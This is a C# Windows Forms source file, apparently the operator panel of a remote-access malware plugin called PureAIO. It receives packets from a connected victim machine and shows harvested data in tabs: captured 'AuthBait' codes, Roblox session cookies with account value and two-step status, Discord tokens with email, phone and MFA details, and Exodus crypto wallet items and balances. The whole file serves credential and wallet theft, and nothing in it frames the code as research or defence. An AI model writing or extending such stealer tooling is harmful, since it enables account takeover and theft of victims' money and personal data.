using System;
using System.Windows.Forms;
using PluginSDK.Interfaces;
using PluginSDK.Packets;

namespace PureAIO
{
    public partial class Form1 : Form
    {
        private Action<IPacket> _send;

        public Form1()
        {
            InitializeComponent();
        }

        // Called by ServerPlugin when the client connects
        public void SetSend(Action<IPacket> send) { _send = send; }

        // Called by ServerPlugin on disconnect
        public void OnDisconnected()
        {
            _send = null;
        }

        // Send a serialized AIOPacket to the connected client
        private void SendPacket(AIOPacket pkt)
        {
            if (_send == null) return;
            var buf = ServerPlugin.Serialize(pkt);
            _send(new CustomPacket { Buffer = buf });
        }

        // ── AuthBait tab ──────────────────────────────────────────────────────
        public void HandleAuthBaitResponse(AuthBaitCodeResponse resp)
        {
            if (InvokeRequired) { Invoke(new Action(() => HandleAuthBaitResponse(resp))); return; }

            if (resp.Success)
                rtbAuthBait.AppendText($"[+] Code captured: {resp.Code}\r\n");
            else
                rtbAuthBait.AppendText($"[-] AuthBait failed: {resp.Error}\r\n");
        }

        // ── Roblox cookie tab ─────────────────────────────────────────────────
        public void HandleCookieResponse(RobloxCookieResponse resp)
        {
            if (InvokeRequired) { Invoke(new Action(() => HandleCookieResponse(resp))); return; }

            lvCookies.Items.Clear();
            if (!resp.Success)
            {
                rtbCookieLog.AppendText($"[-] Error: {resp.Error}\r\n");
                return;
            }
            foreach (var c in resp.Cookies)
            {
                var row = new ListViewItem(c.Source);
                row.SubItems.Add(c.Value.Length > 40 ? c.Value.Substring(0, 40) + "…" : c.Value);
                row.SubItems.Add(c.UserId > 0 ? c.UserId.ToString() : "");
                row.SubItems.Add(c.Username    ?? "");
                row.SubItems.Add(c.DisplayName ?? "");
                row.SubItems.Add(c.Robux > 0   ? c.Robux.ToString("N0") : "");
                row.SubItems.Add(c.IsPremium   ? "Yes" : "");
                row.SubItems.Add(c.TwoStepEnabled ? "Yes" : "");
                row.SubItems.Add(c.Country     ?? "");
                row.SubItems.Add(c.AccountAge  ?? "");
                row.SubItems.Add(c.EnrichError ?? "");
                lvCookies.Items.Add(row);
            }
            rtbCookieLog.AppendText($"[+] {resp.Cookies.Count} cookie(s) collected\r\n");
        }

        // ── Discord token tab ─────────────────────────────────────────────────
        public void HandleTokenResponse(DiscordTokenResponse resp)
        {
            if (InvokeRequired) { Invoke(new Action(() => HandleTokenResponse(resp))); return; }

            lvTokens.Items.Clear();
            if (!resp.Success)
            {
                rtbTokenLog.AppendText($"[-] Error: {resp.Error}\r\n");
                return;
            }
            foreach (var t in resp.Tokens)
            {
                var row = new ListViewItem(t.Source);
                row.SubItems.Add(t.Value.Length > 30 ? t.Value.Substring(0, 30) + "…" : t.Value);
                row.SubItems.Add(t.UserId        ?? "");
                row.SubItems.Add(t.Username      ?? "");
                row.SubItems.Add(t.GlobalName    ?? "");
                row.SubItems.Add(t.Email         ?? "");
                row.SubItems.Add(t.EmailVerified ? "Yes" : "");
                row.SubItems.Add(t.Phone         ?? "");
                row.SubItems.Add(t.MfaEnabled    ? "Yes" : "");
                row.SubItems.Add(NitroLabel(t.NitroType));
                row.SubItems.Add(t.NitroExpiry   ?? "");
                row.SubItems.Add(t.Locale        ?? "");
                row.SubItems.Add(t.AccountCreated > 0
                    ? DateTimeOffset.FromUnixTimeMilliseconds(t.AccountCreated).ToString("yyyy-MM-dd")
                    : "");
                row.SubItems.Add(t.EnrichError ?? "");
                lvTokens.Items.Add(row);
            }
            rtbTokenLog.AppendText($"[+] {resp.Tokens.Count} token(s) collected\r\n");
        }

        // ── Exodus tab ────────────────────────────────────────────────────────
        public void HandleExodusResponse(ExodusResponse resp)
        {
            if (InvokeRequired) { Invoke(new Action(() => HandleExodusResponse(resp))); return; }

            lvExodusData.Items.Clear();
            lvExodusBalances.Items.Clear();

            if (!resp.Success)
            {
                rtbExodusLog.AppendText($"[-] Error: {resp.Error}\r\n");
                return;
            }

            foreach (var item in resp.Items)
            {
                var row = new ListViewItem(item.Kind);
                row.SubItems.Add(item.Wallet ?? "");
                row.SubItems.Add(item.Value  ?? "");
                lvExodusData.Items.Add(row);
            }

            if (resp.Balances != null)
            {
                foreach (var b in resp.Balances)
                {
                    var row = new ListViewItem(b.Ticker);
                    row.SubItems.Add(b.Name       ?? "");
                    row.SubItems.Add(b.Balance    ?? "");
                    row.SubItems.Add(b.FiatValue  ?? "");
                    row.SubItems.Add(b.Address    ?? "");
                    row.SubItems.Add(b.IsEnabled  ? "Yes" : "");
                    lvExodusBalances.Items.Add(row);
                }
            }

            rtbExodusLog.AppendText(
                $"[+] {resp.Items.Count} item(s), " +
                $"{resp.Balances?.Count ?? 0} balance(s)\r\n");
        }

        // ── Helpers ───────────────────────────────────────────────────────────
        private static string NitroLabel(int t) => t switch
        {
            1 => "Classic",
            2 => "Boost",
            3 => "Basic",
            _ => ""
        };
    }
}
